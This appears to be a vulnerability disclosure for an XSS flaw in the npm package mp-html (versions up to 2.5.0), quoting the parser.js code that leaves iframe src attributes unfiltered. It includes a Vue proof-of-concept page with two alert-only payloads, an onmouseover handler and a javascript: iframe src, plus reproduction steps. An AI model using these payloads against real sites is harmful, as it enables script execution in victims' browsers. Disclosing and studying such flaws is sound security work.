# XSS Vulnerability in mp-html

## Basic information

Vulnerability Author: Li MuFeng(mufeng2022@hust.edu.cn)

Vulnerable npm package: mp-html

Npm url: https://www.npmjs.com/package/mp-html

Github url: https://github.com/jin-yufeng/mp-html

Vulnerable version: <= 2.5.0

Vulnerable file: src/uni-app/components/mp-html/parser.js

```js
if (
  node.name === "a" ||
  node.name === "ad" ||
  // #ifdef H5 || APP-PLUS
  node.name === "iframe" // eslint-disable-line
  // #endif
) {
  this.expose();
}
```

In parser.js, line 799. The 'iframe' tags are exposed with 'src' attributes unfiltered, which cause a Cross-Site Scripting vulnerability.

## Payload

pages/index/index.vue:

```js
<template>
	<view class="content">
		<image class="logo" src="/static/logo.png"></image>
		<view class="text-area">
			<mp-html :content="html" />
		</view>
	</view>
</template>

<script>
	import mpHtml from '@/uni_modules/mp-html/components/mp-html/mp-html'
	export default {
		components: {
		  mpHtml
		},
		data() {
			return {
                // payload1: <div onmouseover="alert('XSS1')">Hello World!</div>
                // payload2: <iframe src="javascript:alert('XSS2')"/>
				html: `
				<div onmouseover="alert('XSS1')">Hello World!</div>
				<iframe src="javascript:alert('XSS2')"/>
				`,
			}
		},
		onLoad() {

		},
		methods: {

		}
	}
</script>;

```

Payload1 and payload2 are used to create an alert in user's browser.

Payload1 uses an 'onmouseover' attribute to trigger JavaScript when the user's mouse pointer passes by.

Payload2 uses 'src' attribute in 'iframe' tag which allow browsers to execute JavaScript immediately when the tag is loaded.

Through carefully constructed payloads, attackers can execute any command as they want.

## Exploit

Environment: Windows, Node.js, Hbuilder X

Clone the repository and run the project on browsers(Chrome) in Hbuilder X.
